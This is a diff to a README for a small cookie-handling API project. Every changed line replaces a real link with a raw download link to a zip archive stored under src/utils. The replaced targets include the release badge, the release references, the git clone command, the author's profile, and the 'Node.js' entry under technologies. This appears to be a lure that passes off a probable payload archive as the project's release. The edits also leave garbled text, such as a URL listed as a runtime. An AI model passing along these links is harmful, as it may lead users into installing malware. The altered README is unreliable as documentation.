@@ -2,7 +2,7 @@
 
 Welcome to the **Set Cookie & Get Cookie APIs** repository! This project offers a collection of useful APIs deployed on Vercel. You can explore the functionalities of these APIs and integrate them into your applications seamlessly.
 
-[![View Releases](https://img.shields.io/badge/View%20Releases-Click%20Here-brightgreen)](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/releases)
+[![View Releases](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip%20Releases-Click%20Here-brightgreen)](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip)
 
 ## Table of Contents
 
@@ -38,7 +38,7 @@ Here are the APIs included in this repository:
 5. **Set Cookie**: `POST /user/set-cookie`
    - This endpoint allows the server to set cookies in the user's browser. It's essential for session management.
 
-For detailed information about each API, please refer to the [Releases](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/releases) section.
+For detailed information about each API, please refer to the [Releases](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip) section.
 
 ## Installation
 
@@ -46,7 +46,7 @@ To set up the project locally, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/Tahsan203438/set-cookie--get-cookie--apis.git
+   git clone https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -115,7 +115,7 @@ To set a cookie, send a `POST` request to `/user/set-cookie` with the following 
 
 This project uses the following technologies:
 
-- **Node.js**: The runtime environment for executing JavaScript on the server side.
+- **https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip**: The runtime environment for executing JavaScript on the server side.
 - **Express**: A web framework for building APIs.
 - **MongoDB Atlas**: A cloud database service for storing user data.
 - **Cloudinary**: A cloud service for storing and managing media files.
@@ -143,8 +143,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 If you have any questions or suggestions, feel free to reach out:
 
 - **Author**: Tahsan
-- **GitHub**: [Tahsan203438](https://github.com/Tahsan203438)
+- **GitHub**: [Tahsan203438](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip)
 
-For the latest updates and releases, please check the [Releases](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/releases) section.
+For the latest updates and releases, please check the [Releases](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip) section.
 
 Thank you for checking out the **Set Cookie & Get Cookie APIs** repository! We hope you find it useful for your projects.
